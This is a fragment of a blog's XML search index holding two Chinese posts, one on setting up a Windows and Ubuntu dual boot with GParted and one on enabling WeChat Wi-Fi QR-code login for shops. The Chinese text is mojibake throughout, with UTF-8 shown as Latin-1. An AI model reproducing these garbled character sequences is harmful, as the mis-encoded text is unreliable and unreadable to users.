          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssh </tag>
            
            <tag> linux </tag>
            
            <tag> å¯†é’¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linuxä¸‹å®‰è£…Windowsç³»ç»Ÿæ•™ç¨‹</title>
      <link href="/post/install-windows-on-linux/"/>
      <url>/post/install-windows-on-linux/</url>
      
        <content type="html"><![CDATA[<p>ä»Šå¤©ï¼Œæœ‰ä¸€å°å·²ç»å®‰è£…äº†Ubuntu 16.04ï¼Œæœªåˆ†åŒºçš„ç³»ç»Ÿéœ€è¦å®‰è£…Windows 7åŒç³»ç»Ÿã€‚</p><a id="more"></a><p>é‚£æ¥ä¸‹æ¥çš„ç¬¬ä¸€æ­¥è‡ªç„¶å°±æ˜¯åˆ†åŒºäº†ï¼Œåœ¨Windowsä¸­ç£ç›˜ç²¾çµåˆ†åŒºç”¨çš„æºœï¼Œä½†Linuxä¸­æ€ä¹ˆåˆ†åŒºå‘¢ï¼ŸæŸ¥è¯¢åå¾—çŸ¥Linuxä¸­å¯ä»¥ç”¨Gpartedè§†å›¾å·¥å…·æ¥åˆ†åŒºï¼Œæ‰€ä»¥ï¼ŒUbuntuç³»ç»Ÿç”¨apt-get install gpartedï¼ŒCentOSç”¨yum install gpartedå®‰è£…ã€‚</p><p>ä½ ä»¥ä¸ºåˆ†åŒºå°±è¿™ä¹ˆé¡ºåˆ©ï¼Ÿtoo young too simpleï¼Œè¿›å»åæ‰å‘ç°æ­£åœ¨è¿è¡Œçš„ç³»ç»Ÿæ‰€åœ¨åˆ†åŒºæ˜¯ä¸å¯ä»¥æ‰§è¡Œåˆ†åŒºæ“ä½œçš„ï¼Œå…·ä½“çš„è¡¨ç°å°±æ˜¯/dev/sda*æœ‰æŠŠé’¥åŒ™ï¼Œå¹¶ä¸”ç£ç›˜å®¹é‡çš„è°ƒæ•´æœ€å¤§å€¼å’Œæœ€å°å€¼éƒ½æ˜¯ç£ç›˜æ€»å®¹é‡ã€‚å¥½å§ï¼Œå†æ¬¡Googleï¼ŒåŸæ¥å¯ä»¥ç”¨Live USBï¼ˆç±»ä¼¼äºWindowsä¸‹çš„PEç¯å¢ƒï¼‰æ¥è¿›è¡Œåˆ†åŒºæ“ä½œï¼Œæ¥ä¸‹æ¥å°±å¼€å§‹ç”¨è½¯ç¢Ÿé€šåˆ¶ä½œUbuntuçš„å¯åŠ¨ç›˜ï¼Œåœ¨æ¼«é•¿çš„ç­‰å¾…åç»ˆäºé¡ºåˆ©åˆ†å‡ºä¸€ä¸ªç©ºç™½åˆ†åŒºï¼Œç„¶åç”¨gpartedå°†æœªåˆ†é…çš„åˆ†åŒºæ ¼å¼åŒ–ä¸ºNTFSæ ¼å¼ï¼ˆ<font color=red>Windowsç³»ç»Ÿåˆ†åŒºå¿…é¡»æ­¤æ ¼å¼</font>ï¼‰ã€‚</p><p>æ¥ä¸‹æ¥ç”¨ä¼˜å¯é€šå®‰è£…Windows 7ï¼Œåœ¨é‡å¯çš„è¿‡ç¨‹ä¸­ç³»ç»Ÿæç¤ºâ€œwindows boot manager has been blocked by the current security policyâ€ï¼Œé‚£å°±å…³äº†booté€‰é¡¹çš„secure bootå§ï¼Œå…´å†²å†²çš„è¿›å»åå‘ç°è¿™ä¸ªé€‰é¡¹æ˜¯ï¼ç°ï¼çš„ï¼æˆ‘&amp;*#w&amp;@%â€¦â€¦æŠ˜è…¾åŠå¤©æ‰æƒ³èµ·æ¥ï¼Œç°åœ¨çš„ç³»ç»Ÿç¯å¢ƒæ˜¯UEFI+GPTï¼Œè€ŒWindows 7åŠä»¥ä¸‹åªæ”¯æŒBIOS+MBRï¼Œè¦å¼ºåˆ¶å®‰è£…Windows 7åªèƒ½å°†GPTè½¬ä¸ºMBRäº†ï¼Œä½†è¿™æ ·ä¼šæ¸…ç©ºå…¨ç›˜æ•°æ®ï¼Œæƒè¡¡ä¹‹ä¸‹ï¼Œè£…Windows 10 LTSBå§ï¼Œæ°å¥½ä¹‹å‰å°è£…è¿‡ã€‚é‡æ–°å°†Windowsåˆ†åŒºæ ¼æ‰åå¼€å§‹å®‰è£…ï¼Œä¸€åˆ‡é¡ºåˆ©ï¼ŒåŠå°æ—¶åå®‰è£…ç»“æŸã€‚åŒç³»ç»Ÿéƒ½èƒ½é¡ºåˆ©è¿›å…¥å’Œæ­£å¸¸ä½¿ç”¨ã€‚</p><p>æ­£å½“æˆ‘ä¸ºè‡ªå·±ç‚¹èµæ—¶ï¼Œå¼€æœºå‘ç°ç«Ÿç„¶æ²¡æœ‰åŒç³»ç»Ÿé€‰æ‹©å»¶æ—¶ï¼Œæ¯æ¬¡è‡ªåŠ¨è¿›å…¥å¯åŠ¨é¡ºåºçš„ç¬¬ä¸€ä¸ªç³»ç»Ÿï¼Œé‚£è¿™ä¸ªé—®é¢˜æ€ä¹ˆè§£å†³å‘¢ï¼Ÿå†æ¬¡æŸ¥è¯¢åå‘ç°EasyBCDå·¥å…·å¯ä»¥ä¿®å¤å¼•å¯¼ï¼Œä½¿åŒç³»ç»Ÿå¼€æœºå‡ºç°é€‰æ‹©æŒ‰é’®ï¼Œä¸è¿‡å‘¢ï¼Œç”±äºæœ‰å…¶ä»–äº‹æš‚æ—¶æ²¡è¯•ï¼Œæœ‰ç©ºå†æï¼Œæ¯•ç«Ÿä¸æ˜¯ç‰¹åˆ«ä¸¥é‡çš„é—®é¢˜ã€‚</p><hr><p>æ¬¡æ—¥æ›´<br>ä»Šå¤©å‘ç°æœ‹å‹çš„ç”µè„‘å¼€æœºç«Ÿç„¶æœ‰äº†ç³»ç»Ÿé€‰æ‹©é¡¹ï¼Œé‚£æˆ‘ä¹Ÿå°±ä¸ç”¨æŠ˜è…¾äº†ï¼Œè¿™æ¬¡ç³»ç»Ÿçš„å®‰è£…ä»¥å®Œç¾æ”¶åœºï¼Œæ’’èŠ±ï½</p>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Windows </tag>
            
            <tag> æ“ä½œç³»ç»Ÿ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¾®ä¿¡è¿Wi-Fiä½¿ç”¨æ•™ç¨‹</title>
      <link href="/post/wechat-wifi-tutorial/"/>
      <url>/post/wechat-wifi-tutorial/</url>
      
        <content type="html"><![CDATA[<p>å¦‚ä»Šï¼Œè¶Šæ¥è¶Šå¤šçš„å•†å®¶å¼€å§‹æ”¯æŒå…è´¹Wi-Fiï¼Œå¾ˆå¤šé¡¾å®¢åˆ°åº—åéƒ½ä¼šè¯¢é—®Wi-Fiå¯†ç æ˜¯å¤šå°‘</p><a id="more"></a>ï¼Œæœ‰äº›æ‰“å°çš„è´´åœ¨å¢™ä¸Šçš„è¿˜å¥½ï¼Œè‡³å°‘è¯†åˆ«èµ·æ¥ä¸æ˜¯é‚£ä¹ˆè´¹åŠ²ï¼Œæœ‰äº›æ‰‹å†™çš„å°±è¦å¤šèŠ±ä¸€äº›æ—¶é—´æ‰èƒ½è¿æ¥æˆåŠŸã€‚æˆ‘å°±åœ¨æƒ³ï¼Œæœ‰æ²¡æœ‰ä»€ä¹ˆæ›´åŠ ä¾¿æ·çš„æ–¹å¼è®©ç”¨æˆ·ä¸€é”®è¿æ¥ï¼Ÿå¸¦ç€è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘æƒ³åˆ°äº†å¦‚ä»Šæ— å¤„ä¸åœ¨çš„äºŒç»´ç ï¼ŒäºŒç»´ç ä¸­å¯ä»¥è•´è—é“¾æ¥ã€æ–‡æœ¬ç­‰ä¿¡æ¯ï¼Œå¦‚æœé¡¾å®¢èƒ½å¤Ÿæ‰«æäºŒç»´ç ç›´æ¥è¿æ¥å²‚ä¸æ˜¯æ›´å¥½ï¼Ÿåœ¨ä¸€ç•ªæŸ¥æ‰¾åæ‰¾åˆ°äº†è”å›¾ç½‘ï¼Œè¯¥ç½‘ç«™æ”¯æŒWi-Fiæ ¼å¼çš„äºŒç»´ç ï¼Œä¸”å¯¹ç”Ÿæˆçš„äºŒç»´ç å…è®¸åµŒå…¥logoç­‰è‡ªå®šä¹‰è®¾ç½®ï¼Œå¢æ·»ä¸€äº›è¶£å‘³ã€‚å°è¯•ä¸€ç•ªåä»¥å¤±è´¥å‘Šç»ˆï¼Œè¿™ç§æ–¹æ¡ˆçš„é—®é¢˜åœ¨äºï¼Œæ‰‹æœºçš„ç¡®å¯ä»¥è¯»å–å‡ºWi-Fiåå’Œå¯†ç ï¼Œä½†ç»“æœæ˜¯æ–‡æœ¬çš„å½¢å¼ï¼Œé¡¾å®¢è¿˜éœ€å¤åˆ¶ç²˜è´´æ‰å¯ä»¥ã€‚ç„¶åå°±åœ¨æƒ³ï¼Œç°åœ¨è¶Šæ¥è¶Šå¤šçš„è½¯ä»¶éƒ½æœ‰æ‰«æäºŒç»´ç åŠŸèƒ½ï¼Œé‚£è°æ¥åšè¿™ä¸ªWi-Fiä¸€é”®è¿æ¥æ˜¯æœ€ä½³äººé€‰å‘¢ï¼Ÿç­”æ¡ˆå½“ç„¶æ˜¯è€å°‘å’¸å®œçš„å¾®ä¿¡ï¼äºæ˜¯åˆå»è¿›è¡ŒæŸ¥è¯¢ï¼Œæœç„¶ï¼Œå¾®ä¿¡å·²äº2015å¹´3æœˆä»½åœ¨å…¬ä¼—å·æ¨å‡ºäº†è¯¥åŠŸèƒ½ï¼Œä¸‹é¢ï¼Œæˆ‘ä»¬å°±æ¥çœ‹çœ‹å¦‚ä½•å¼€é€šå’Œä½¿ç”¨å§ï½<p>é¦–å…ˆï¼Œä½ è¦æœ‰ä¸€ä¸ªé—¨é¢åº—ï¼ˆè‡³å°‘è¦è®©å¾®ä¿¡ç›¸ä¿¡ä½ æœ‰ï¼‰ï¼Œç„¶åä½ è¿˜è¦æœ‰ä¸€ä¸ªå¾®ä¿¡å…¬ä¼—å·ï¼Œè¿˜æ²¡æœ‰çš„å•†å®¶å¿«å»æ³¨å†Œä¸€ä¸ªå§ï¼Œç›¸ä¿¡å¾®ä¿¡çš„æ³¨å†Œå¼•å¯¼å·²ç»å¾ˆæ¸…æ¥šäº†ã€‚<br>æ³¨å†ŒæˆåŠŸåï¼Œç™»å½•å…¬ä¼—å·åå°ï¼Œç‚¹å‡»â€œæ·»åŠ åŠŸèƒ½æ’ä»¶â€ï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼Œç„¶åç‚¹å‡»â€œå¾®ä¿¡è¿Wi-Fiâ€ï¼Œç„¶åä¾æ­¤ç‚¹å‡»â€œå¼€é€šâ€â€”&gt;â€œåŒæ„â€æœåŠ¡åè®®â€”&gt;â€è¿”å›â€â€”&gt;â€œæŸ¥çœ‹åŠŸèƒ½â€ã€‚<br><img src="https://tva1.sinaimg.cn/large/0082zybply1gc0rbvw8ozj30m80pawfw.jpg" alt="å…¬ä¼—å·èœå•"></p><p><img src="https://tva1.sinaimg.cn/large/0082zybply1gc0rbcrde9j30m80h1gne.jpg" alt="å…¬ä¼—å·æ’ä»¶"></p><p>è‡³æ­¤ï¼Œå¾®ä¿¡è¿Wi-Fiå¼€é€šæˆåŠŸï¼Œå·¦ä¾§åŠŸèƒ½æ–°å¢â€œé—¨åº—ç®¡ç†â€å’Œâ€œå¾®ä¿¡è¿Wi-Fiâ€ä¸¤ä¸ªæŒ‰é’®ã€‚</p><p><img src="https://tva1.sinaimg.cn/large/0082zybply1gc0rap0m8aj30m80z3jtb.jpg" alt="å…¬ä¼—å·æ–°å¢èœå•"></p><p>ç°åœ¨ï¼Œæˆ‘ä»¬ç‚¹å‡»â€œé—¨åº—ç®¡ç†â€ï¼Œç„¶åç‚¹å‡»â€œæ–°å»ºé—¨åº—â€ï¼Œä¹‹åå¡«å†™é—¨åº—çš„åŸºæœ¬ä¿¡æ¯ï¼Œå®Œæˆååˆ‡æ¢åˆ°â€œå¾®ä¿¡è¿Wi-Fiâ€ï¼Œç‚¹å‡»â€œè®¾å¤‡ç®¡ç†â€å’Œâ€œæ·»åŠ è®¾å¤‡â€ï¼Œå¡«å†™ç›¸å…³ä¿¡æ¯å³å¯ï¼ˆæ³¨æ„æ­¤å¤„çš„<font color=red>Wi-Fiåå’Œå¯†ç è‡³å°‘è¦æœ‰ä¸€ä¸ªæ˜¯ä»¥å¤§å†™çš„â€œWXâ€å¼€å¤´</font>ï¼‰ã€‚ç„¶åå°†ç”Ÿæˆçš„äºŒç»´ç ä¸‹è½½å¹¶ç²˜è´´åœ¨åº—å†…çš„é†’ç›®ä½ç½®å³å¯ï¼Œé¡¾å®¢æ¥äº†ä¹‹ååªéœ€ä½¿ç”¨å¾®ä¿¡æ‰«æè¯¥äºŒç»´ç å³å¯ä¸€é”®è¿æ¥Wi-Fiï¼ˆæ‰«æäºŒç»´ç æ—¶éœ€è”ç½‘ï¼Œä¼š<strong>æ¶ˆè€—å°‘é‡æµé‡</strong>ï¼‰ã€‚</p><p>å…¬ä¼—å·åå°æ›´å¯æŸ¥çœ‹Wi-Fiåœ¨çº¿äººæ•°ä»¥åŠå†å²è¶‹åŠ¿å›¾ï¼Œæ®æ­¤åˆ†æåº—é“ºçš„å®¢æµé‡ï¼Œè°ƒæ•´åº—é“ºçš„ä¸šåŠ¡ã€‚æ›´å¯å‘ç”¨æˆ·æ¨é€ä¼˜æƒ åˆ¸ç­‰ä¿ƒé”€å†…å®¹ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å…¶ä»– </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¾®ä¿¡ </tag>
            
            <tag> wifi </tag>
            
            <tag> å…¬ä¼—å· </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
